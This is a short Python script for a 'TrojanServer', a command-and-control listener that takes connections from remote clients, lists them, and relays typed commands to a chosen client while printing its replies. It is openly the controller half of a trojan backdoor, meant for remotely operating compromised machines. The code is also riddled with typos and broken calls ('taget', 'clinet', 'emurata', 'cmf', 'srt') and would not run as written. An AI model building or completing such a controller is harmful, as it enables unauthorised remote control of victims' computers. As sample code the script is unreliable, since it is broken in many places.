#!/usr/bin/python3
import socket, threading

class TrojanServer(object):
    def __init__(self):
        self.host = "0.0.0.0"
        self.port = 80
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.host, self.port))
        print("Server running ...")
        
    def listener(self):
        self.s.listen(10)
        while True:
            client, address = self.s.accept()
            ipstr = address[0] + ":" + str(address[1])
            client.settimeout(60)
            print("GET connection from " + ipstr)
            threading.Thread(taget = self.client_conn, name=ipstr, args = (clinet.address)).start()
        
        
    def client_conn(self,client, address):
        while True:
            ipstr = address[0] + ":" + str(address[1]) + " >> "
            cmd = ''
            while cmd == "":
                cmd = input(ipstr).strip()
            if cmd.lower() == "show clients":
                print("CLIENTS: ")
                print('================')
                for t in threading.emurata():
                    print(t.getname())
            elif cmf.lower().startswith("useconn"):
                tmp = cmd.split(" ")
                for t in threading.enumerate():
                    if(t.getName() == tmp[1].strip()):
                        t.join()
            elif cmd.lower() == "help" or cmd.lower() == "?":
                print("COMMANDS:")
                print("=========")
                print("show clients          - List all connected clients")
                print("useconn [IP:PORT]     - Switch to the connection")
                print("tell os               - Show OS of the clinet")
                print("help                  - Show all commands and options")
            else:
                try:
                    b_arr = bytearray()
                    b_arr.extend(map(ord, cmd))
                    client.send(b_arr)
                    
                    data = client.recv(8192).decode("UTF-8", errors="replace")
                    
                    if data:
                        print(str(data))
                        if str(data) == "Bype!":
                            raise ConnectionError('Client disconnected')
                    else:
                        raise ConnectionError('Client disconnected')
                except ConnectionError:
                    print("Client " + srt(address) + " disconnected")
                    client.close()
                    return False

if __name__ == "__main__":
    my_trojan_server = TrojanServer()
    my_trojan_server.listener()
    
                
                                           
            
